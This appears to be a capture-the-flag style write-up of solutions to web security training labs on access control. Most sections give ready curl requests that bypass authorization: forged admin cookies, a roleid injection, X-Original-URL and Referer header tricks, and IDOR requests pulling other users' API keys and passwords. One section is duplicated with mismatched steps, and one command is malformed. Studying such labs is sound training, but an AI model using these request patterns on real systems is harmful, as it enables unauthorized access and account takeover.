## Access control vulnerabilities and privilege escalation
### Lab: Unprotected admin functionality

This lab has an unprotected admin panel.

Solve the lab by deleting the user carlos. 

`curl 'https://ID.web-security-academy.net/administrator-panel/delete?username=carlos'`

### Lab: Unprotected admin functionality with unpredictable URL

This lab has an unprotected admin panel. It's located at an unpredictable location, but the location is disclosed somewhere in the application.

Solve the lab by accessing the admin panel, and using it to delete the user carlos. 
```js
var isAdmin = false;
if (isAdmin) {
   var topLinksTag = document.getElementsByClassName("top-links")[0];
   var adminPanelTag = document.createElement('a');
   adminPanelTag.setAttribute('href', '/admin-n7cwxc');
   adminPanelTag.innerText = 'Admin panel';
   topLinksTag.append(adminPanelTag);
   var pTag = document.createElement('p');
   pTag.innerText = '|';
   topLinksTag.appendChild(pTag);
}
```
`curl 'https://ID.web-security-academy.net/admin-n7cwxc/delete?username=carlos'`
### Lab: User role controlled by request parameter


This lab has an admin panel at /admin, which identifies administrators using a forgeable cookie.

Solve the lab by accessing the admin panel and using it to delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 
```
curl -X GET "https://ID.web-security-academy.net/admin/delete?username=carlos" \
-H "Cookie: Admin=true; session=..."
```
### Lab: User role can be modified in user profile

This lab has an admin panel at /admin. It's only accessible to logged-in users with a roleid of 2.

Solve the lab by accessing the admin panel and using it to delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 
```
curl -X POST "https://ID.web-security-academy.net/my-account/change-email" \
-H "Cookie: session=tsmyRIdrLzpItSK4AVZoh3BRkXuNAIhD" \
--data-raw '{"email":"a@a","roleid":2}'
```
```
curl "https://0a0c00ea040ae2deac44a8f7007900a6.web-security-academy.net/admin/delete?username=carlos" \
-H "Cookie: session=tsmyRIdrLzpItSK4AVZoh3BRkXuNAIhD"
```
### Lab: URL-based access control can be circumvented
This website has an unauthenticated admin panel at /admin, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the X-Original-URL header.

To solve the lab, access the admin panel and delete the user carlos. 

- Send the email submission request to Burp Repeater, add "roleid":2 into the JSON in the request body, and resend it.
- Observe that the response shows your roleid has changed to 2.
- Browse to /admin and delete carlos. 

### Lab: URL-based access control can be circumvented

This website has an unauthenticated admin panel at /admin, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the X-Original-URL header.

To solve the lab, access the admin panel and delete the user carlos. 
```
curl -X GET "https://0acc009d04f0d3ad80b78aed00fc007d.web-security-academy.net/?username=carlos" \
-H "X-Original-URL: /admin/delete" \
-H "Cookie: session=26tyO315CIK58N8uzwspu5lus3MZnnPs"
```

### Lab: Method-based access control can be circumvented

This lab implements access controls based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.

To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator. 

```
curl 'https://ID.web-security-academy.net/admin-roles?username=wiener&action=upgrade'/
-H "Cookie: session=..."
```

### Lab: User ID controlled by request parameter

This lab has a horizontal privilege escalation vulnerability on the user account page.

To solve the lab, obtain the API key for the user carlos and submit it as the solution.

You can log in to your own account using the following credentials: wiener:peter 
```
curl -s "https://ID.web-security-academy.net/my-account?id=carlos" \
-H "Cookie: session=..." |\
grep "API Key"
```
### Lab: User ID controlled by request parameter, with unpredictable user IDs

This lab has a horizontal privilege escalation vulnerability on the user account page, but identifies users with GUIDs.

To solve the lab, find the GUID for carlos, then submit his API key as the solution.

You can log in to your own account using the following credentials: wiener:peter 

Find a blog post by carlos and observe that the URL contains his user ID
```
curl -s "https://ID.web-security-academy.net/my-account?id=<carlos_id>" \
-H "Cookie: session=..." |\
grep "API Key"
```

### Lab: User ID controlled by request parameter with data leakage in redirect

This lab contains an access control vulnerability where sensitive information is leaked in the body of a redirect response.

To solve the lab, obtain the API key for the user carlos and submit it as the solution.

You can log in to your own account using the following credentials: wiener:peter
```
curl -s "https://ID.web-security-academy.net/my-account?id=carlos" \
-H "Cookie: session=..." |\
grep "API Key"
```
### Lab: User ID controlled by request parameter with password disclosure

This lab has user account page that contains the current user's existing password, prefilled in a masked input.

To solve the lab, retrieve the administrator's password, then use it to delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 

Get the admin's password
```
curl -s "https://ID.web-security-academy.net/my-account?id=administrator" \
-H "Cookie: session=..." |\
grep "password"
```
### Lab: Insecure direct object references

This lab stores user chat logs directly on the server's file system, and retrieves them using static URLs.

Solve the lab by finding the password for the user carlos, and logging into their account. 

```
curl -s "https://0ae70075034194f2809358d200fa0033.web-security-academy.net/download-transcript/1.txt" \
-H "Cookie: session=CuUT5IHHd8huYTLJIx1JVwMjxXXlFKeb" |\
grep "password"
```
### Lab: Multi-step process with no access control on one step


This lab has an admin panel with a flawed multi-step process for changing a user's role. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.

To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator. 
```
curl -X POST "https://ID.web-security-academy.net/admin-roles" \
-H "Host: ID.web-security-academy.net" \
-H "Cookie: session=admin_cookie_here>" \
-H "Content-Type: application/x-www-form-urlencoded" \
--data-raw "action=upgrade&confirmed=true&username=wiener"
```
### Lab: Referer-based access control

This lab controls access to certain admin functionality based on the Referer header. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.

To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator. 
```
curl "https://ID.web-security-academy.net/admin-roles?username=wiener&action=upgrade" \
-H "Cookie: session=wiener_cookie_here>" \
-H "Referer: https://0a11000c03d1c5f7822a97d5008200ce.web-security-academy.net/admin"
```


